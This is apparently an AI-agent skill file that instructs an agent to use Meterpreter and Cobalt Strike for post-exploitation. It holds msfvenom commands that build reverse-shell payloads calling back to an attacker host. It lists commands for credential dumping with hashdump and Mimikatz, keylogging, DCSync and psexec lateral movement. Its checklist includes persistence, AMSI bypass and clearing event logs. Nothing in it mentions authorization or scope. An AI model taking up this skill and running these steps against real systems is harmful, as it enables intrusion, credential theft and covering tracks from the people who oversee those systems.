---
name: meterpreter-cobalt-strike-basics
description: "Use when using Meterpreter and Cobalt Strike."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [meterpreter, cobalt-strike, beacon, post-exploitation, Mettle, payload]
    related_skills: [command-control-c2-infrastructure, evasion-techniques-av-bypass, privilege-escalation-techniques, lateral-movement-pivoting]
---

# Meterpreter and Cobalt Strike Basics

Using Meterpreter and Cobalt Strike for post-exploitation — from payload generation and privilege escalation through lateral movement, pivoting, and persistence.

## When to Use

- Post-exploitation with Metasploit/Meterpreter
- Cobalt Strike beacon operations
- Payload generation (stageless, staged, reverse, bind)
- Post-exploitation modules (migrate, kiwi, hashdump)

## Meterpreter Commands

```python
METERPRETER_CORE = {
    'sysinfo': 'Get system information (OS, arch, domain, logged-in users)',
    'getuid': 'Current user context',
    'getsystem': 'Attempt privilege escalation to SYSTEM (named pipe impersonation)',
    'migrate': 'Move process to another process (stealth, stability)',
    'hashdump': 'Dump SAM hashes (requires SYSTEM)',
    'kiwi_cmd': 'Mimikatz integration — sekurlsa::logonpasswords',
    'screenshot': 'Capture screenshot of current desktop',
    'keyscan_start': 'Start keylogger (requires explorer.exe migration)',
    'load_kiwi': 'Load Mimikatz extension',
    'background': 'Background current session',
}

# MSFVenom payload generation
MSFVENOM_PAYLOADS = {
    'windows_reverse': "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o payload.exe",
    'linux_reverse': "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f elf -o payload.elf",
    'web_delivery': "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f psh -o payload.ps1",
}

# Cobalt Strike beacon commands
BEACON_COMMANDS = {
    'shell': 'Execute cmd command (shell whoami)',
    'execute-assembly': 'Execute .NET assembly in-memory (execute-assembly /path/to/Seatbelt.exe)',
    'jump': 'Jump to remote host via psexec/winrm (jump psexec target1 smb)',
    'dcsync': 'Extract hashes via DCSync (dcsync [DOMAIN] [USER])',
    'spawn': 'Spawn new beacon in specific process (spawn x64)',
    'powershell-import': 'Import PowerShell script (powershell-import PowerView.ps1)',
}
```

## Verification Checklist

- [ ] Payload generated (MSFVenom or Artifact Kit for Cobalt Strike)
- [ ] Initial access established (reverse shell or beacon)
- [ ] Post-exploitation: hashdump, kiwi, screenshots
- [ ] Privilege escalation to SYSTEM/root
- [ ] Lateral movement via pass-the-hash, psexec, WMI
- [ ] Persistence mechanism installed
- [ ] Pivot proxy through compromised host
- [ ] Cleanup: remove payloads, persistence, event logs
- [ ] OPSEC: process injection, AMSI bypass, log clearing
